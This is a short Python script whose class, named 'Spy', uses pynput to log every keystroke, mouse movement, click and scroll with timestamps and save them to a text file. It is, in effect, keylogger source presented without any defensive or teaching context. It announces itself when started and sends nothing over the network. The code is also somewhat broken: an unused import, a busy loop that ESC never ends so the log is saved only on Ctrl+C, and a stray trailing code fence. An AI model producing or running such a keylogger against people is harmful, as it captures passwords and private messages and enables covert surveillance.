import pyautogui
import pynput
from pynput import keyboard
from datetime import datetime
import threading

class Spy:
    def __init__(self):
        self.activity_log = []
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.mouse_listener = pynput.mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)

    def on_press(self, key):
        try:
            self.activity_log.append((datetime.now(), f"Key pressed: {key.char}"))
        except AttributeError:
            self.activity_log.append((datetime.now(), f"Key pressed: {key}"))

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.keyboard_listener.stop()
            self.mouse_listener.stop()
            print("Keyboard listener stopped")

    def on_move(self, x, y):
        self.activity_log.append((datetime.now(), f"Mouse moved to ({x}, {y})"))

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.activity_log.append((datetime.now(), f"Mouse button {button} clicked"))
        else:
            self.activity_log.append((datetime.now(), f"Mouse button {button} released"))

    def on_scroll(self, x, y, dx, dy):
        self.activity_log.append((datetime.now(), f"Mouse scrolled {dx} {dy}"))

    def start(self):
        self.keyboard_listener.start()
        self.mouse_listener.start()
        print("Spy started. Press ESC to stop.")

    def stop(self):
        self.keyboard_listener.stop()
        self.mouse_listener.stop()

    def save_log(self, filename):
        with open(filename, "w") as f:
            for event in self.activity_log:
                f.write(f"{event[0]} - {event[1]}\n")

def main():
    spy = Spy()
    spy.start()
    while True:
        try:
            pass
        except KeyboardInterrupt:
            spy.stop()
            spy.save_log("activity_log.txt")
            break

if __name__ == "__main__":
    main()
```

